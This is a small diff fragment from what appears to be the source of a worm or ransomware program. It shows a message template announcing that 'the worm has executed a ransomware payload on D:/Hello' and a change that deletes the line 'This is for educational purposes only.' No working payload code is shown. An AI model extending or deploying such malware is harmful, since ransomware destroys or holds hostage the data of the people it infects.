@@ -128,7 +128,6 @@ Time: {datetime.now()}
 
 The worm has executed a ransomware payload on D:/Hello
 
-This is for educational purposes only.
 """
         
         message_locations = [
